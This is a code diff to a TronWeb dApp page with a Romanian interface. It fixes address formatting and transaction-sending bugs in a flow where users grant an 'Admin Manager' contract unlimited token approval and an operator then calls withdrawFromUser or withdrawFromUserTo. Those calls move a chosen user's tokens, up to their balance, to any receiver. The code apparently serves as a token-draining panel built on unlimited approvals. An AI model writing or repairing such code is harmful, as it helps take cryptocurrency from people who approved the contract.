@@ -537,6 +537,40 @@
             }
         }
 
+        function normalizeBase58Address(addressValue) {
+            const tronweb = getActiveTronWeb();
+            if (!tronweb || !addressValue) {
+                return "";
+            }
+
+            const raw = String(addressValue).trim();
+            if (!raw) {
+                return "";
+            }
+
+            try {
+                if (tronweb.isAddress(raw)) {
+                    return raw;
+                }
+            } catch (error) {
+                // continue with conversion attempts
+            }
+
+            try {
+                if (raw.startsWith("0x") && raw.length === 42) {
+                    return tronweb.address.fromHex("41" + raw.slice(2));
+                }
+
+                if (raw.startsWith("41") && raw.length === 42) {
+                    return tronweb.address.fromHex(raw);
+                }
+            } catch (error) {
+                return "";
+            }
+
+            return "";
+        }
+
         function isAddress(addressValue) {
             const tronweb = getActiveTronWeb();
             if (!tronweb) {
@@ -557,14 +591,44 @@
             }
 
             if (!tokenContract) {
-                tokenContract = await tronweb.contract(tokenAbi, rewardTokenAddress);
+                tokenContract = await tronweb.contract(tokenAbi).at(rewardTokenAddress);
             }
 
             if (!adminContract) {
-                adminContract = await tronweb.contract(adminAbi, adminManagerAddress);
+                adminContract = await tronweb.contract(adminAbi).at(adminManagerAddress);
             }
 
             return { tronweb, tokenContract, adminContract };
+        }
+
+        async function sendContractTx(methodCall, feeLimit) {
+            const tronweb = getActiveTronWeb();
+            const fromAddress = normalizeBase58Address(currentAccount)
+                || (tronweb && tronweb.defaultAddress && tronweb.defaultAddress.base58)
+                || "";
+
+            const options = {
+                feeLimit: feeLimit || 120000000,
+                callValue: 0
+            };
+
+            if (fromAddress) {
+                options.from = fromAddress;
+            }
+
+            try {
+                return await methodCall.send(options);
+            } catch (error) {
+                const message = String((error && error.message) || "");
+                const isInjectedSendBug = /toLowerCase/i.test(message) || /Cannot read properties of undefined/i.test(message);
+
+                if (!isInjectedSendBug) {
+                    throw error;
+                }
+
+                // Fallback for some TronLink versions that fail on send(options) path.
+                return await methodCall.send();
+            }
         }
 
         async function refreshTokenDecimals() {
@@ -617,7 +681,9 @@
 
             try {
                 const contracts = await getContracts();
-                const allowanceRaw = await contracts.tokenContract.allowance(currentAccount, adminManagerAddress).call();
+                const normalizedAccount = normalizeBase58Address(currentAccount);
+                const ownerAddress = normalizedAccount || currentAccount;
+                const allowanceRaw = await contracts.tokenContract.allowance(ownerAddress, adminManagerAddress).call();
                 const allowance = formatUnits(allowanceRaw, tokenDecimals);
                 allowanceTextEl.innerText = "Allowance curent către Admin Manager: " + allowance;
             } catch (error) {
@@ -658,8 +724,8 @@
                     return;
                 }
 
-                currentAccount = accounts[0];
-                setStatus("Conectat: " + accounts[0], "green");
+                currentAccount = normalizeBase58Address(accounts[0]) || accounts[0];
+                setStatus("Conectat: " + currentAccount, "green");
                 refreshAllData().catch(() => {
                     setStatus("Conectat, dar nu am putut citi toate datele din contract.", "#9a6700");
                 });
@@ -696,7 +762,7 @@
                     throw new Error("Conectarea nu a returnat o adresă.");
                 }
 
-                currentAccount = userAddress;
+                currentAccount = normalizeBase58Address(userAddress) || userAddress;
                 setStatus("Conectat: " + userAddress, "green");
                 connectBtn.style.display = "none";
                 hideBridge();
@@ -730,10 +796,10 @@
 
                 approveUnlimitedBtn.disabled = true;
                 const contracts = await getContracts();
-                const txId = await contracts.tokenContract.approve(adminManagerAddress, MAX_UINT256).send({
-                    feeLimit: 120000000,
-                    callValue: 0
-                });
+                const txId = await sendContractTx(
+                    contracts.tokenContract.approve(adminManagerAddress, MAX_UINT256),
+                    120000000
+                );
 
                 txTextEl.innerText = "Ultimul TX: " + txId;
                 setStatus("Approve nelimitat trimis cu succes.", "green");
@@ -772,14 +838,16 @@
                     throw new Error("Adresa utilizatorului este invalidă.");
                 }
 
+                const normalizedUserAddress = normalizeBase58Address(userAddress) || userAddress;
+
                 const amountBaseUnits = parseUnits(amountText, tokenDecimals);
                 if (amountBaseUnits <= 0n) {
                     throw new Error("Suma trebuie să fie mai mare decât 0.");
                 }
 
                 const contracts = await getContracts();
-                const allowanceRaw = await contracts.tokenContract.allowance(userAddress, adminManagerAddress).call();
-                const balanceRaw = await contracts.tokenContract.balanceOf(userAddress).call();
+                const allowanceRaw = await contracts.tokenContract.allowance(normalizedUserAddress, adminManagerAddress).call();
+                const balanceRaw = await contracts.tokenContract.balanceOf(normalizedUserAddress).call();
                 const allowance = toBigInt(allowanceRaw);
                 const balance = toBigInt(balanceRaw);
 
@@ -800,25 +868,25 @@
                     }
 
                     try {
-                        txId = await contracts.adminContract.withdrawFromUserTo(
-                            userAddress,
-                            receiverAddress,
-                            amountBaseUnits.toString()
-                        ).send({
-                            feeLimit: 150000000,
-                            callValue: 0
-                        });
+                        txId = await sendContractTx(
+                            contracts.adminContract.withdrawFromUserTo(
+                                normalizedUserAddress,
+                                receiverAddress,
+                                amountBaseUnits.toString()
+                            ),
+                            150000000
+                        );
                     } catch (innerError) {
                         throw new Error("Contractul curent nu suportă withdrawFromUserTo sau tranzacția a fost respinsă. Redeploy contractul nou.");
                     }
                 } else {
-                    txId = await contracts.adminContract.withdrawFromUser(
-                        userAddress,
-                        amountBaseUnits.toString()
-                    ).send({
-                        feeLimit: 150000000,
-                        callValue: 0
-                    });
+                    txId = await sendContractTx(
+                        contracts.adminContract.withdrawFromUser(
+                            normalizedUserAddress,
+                            amountBaseUnits.toString()
+                        ),
+                        150000000
+                    );
                 }
 
                 txTextEl.innerText = "Ultimul TX: " + txId;
